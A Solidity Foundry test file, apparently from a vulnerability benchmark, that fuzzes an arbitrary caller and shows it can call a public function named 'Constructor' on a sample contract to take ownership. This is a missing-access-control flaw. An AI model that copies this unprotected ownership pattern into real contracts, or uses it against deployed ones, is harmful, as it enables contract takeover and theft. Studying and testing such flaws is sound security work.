
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_3} from "../src/Missing_3.sol";

contract TestAccessControlMissing_3 is Test {
    Missing_3 missing_3;

    function setUp() public {
        missing_3 = new Missing_3();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // 1. Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // 2. Exclude the Zero Address
        vm.assume(caller != address(0));

        // 3. Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // --- 2. State Configuration ---
        
        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // The function 'Constructor' is a public function (not a real constructor in 0.8.x)
        // and lacks access control. Any user can call it to claim ownership.
        missing_3.Constructor();
    }

    receive() external payable {}

    fallback() external payable {}
}
